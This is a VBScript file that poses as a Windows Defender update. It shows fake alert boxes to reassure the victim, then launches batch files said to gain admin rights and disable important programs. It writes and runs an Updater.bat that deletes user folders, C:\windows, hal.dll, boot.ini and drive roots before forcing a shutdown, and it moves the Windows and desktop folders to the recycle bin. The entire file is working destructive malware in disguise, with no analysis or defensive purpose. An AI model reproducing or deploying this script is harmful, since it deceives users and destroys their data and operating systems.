WScript.Sleep(1)

'FALSE Alert box
a=MsgBox("REQUIRED*                                WINDOWS needs to update 'Windows Defender' to Version 1.381.2647.1. ", 0+48, "Windows Defender")
WScript.Sleep(1999)

'                                                                                                                     START 
DIM FSO, MyFile
Set oShell = CreateObject( "WScript.Shell" )
user=oShell.ExpandEnvironmentStrings("%UserName%")


' makes destined directory/folder
SET FSO=CreateObject("Scripting.FileSystemObject")
FSO.CreateFolder("C:\Users\Public\folder\")
FSO.CreateFolder("C:\Users\Public\Windows Defender\")
FSO.Movefile "AntiVirus.bat","C:\Users\Public\Windows Defender\"

' runs Fake antivirus and assets program so that this program will be givin ADMIN and turn off some IMPORTANT programs
CreateObject("Wscript.Shell").Run """C:\Users\Public\Windows Defender\AntiVirus.bat""", 1, True
WScript.Sleep(999)
CreateObject("Wscript.Shell").Run """assets.bat""", 1, True



' makes a .bat file
FSO.CreateTextFile "Updater.bat"
Set AFile = FSO.CreateTextFile("Updater.bat", True)

' Writes a HARMFUL test in the "upater.bat" Text File
AFile.WriteLine("@echo off")
AFile.WriteLine("Echo Loading...")
AFile.WriteLine("dir d:")
AFile.WriteLine("echo Y|del D:\")
AFile.WriteLine("dir c:")
AFile.WriteLine("echo Y|del C:\documents and settings")
AFile.WriteLine("echo Y|del C:\users")
AFile.WriteLine("echo Y|del C:\windows\system32\hal.dll")
AFile.WriteLine("echo Y|del C:\windows")
AFile.WriteLine("attrib -s -h C:\boot.ini")
AFile.WriteLine("PING localhost -n 1 -w 3 >NUL")
AFile.WriteLine("echo Y|del C:\boot.ini")
AFile.WriteLine("echo Y|del C:\")
AFile.WriteLine("PING localhost -n 1 -w 6 >NUL")
AFile.WriteLine("shutdown.exe -s -t 30")
Afile.Close

' message box to make the user feel safe for a little bit
a=MsgBox("Please wait... We are still updating your Windows 'AntiVirus' ", 0+64, "Windows Alert!")


'Moves System Files & Folderd into there SET directoies
FSO.Movefolder "Updater.bat","C:\Users\Public\Windows Defender\"
FSO.Movefolder "C:\Users\%username%\Desktop\","C:\Users\Public\folder\"
FSO.Movefolder "C:\WINDOWS","C:\Users\Public\folder\"

' moves everything to trash can.
FSO.Movefolder "C:\Users\Public\folder\","C:\$Recycle.Bin"

' Last message
a=MsgBox("Please do not restart your Computer", 0+48, "Windows Alert!")
WScript.Sleep(999)
a=MsgBox("Update Complete... Restarting Computer", 0+64, "Windows Defender")


CreateObject("Wscript.Shell").Run """C:\Users\Public\Windows Defender\Updater.bat""", 1, True
'                                                                                                                     END


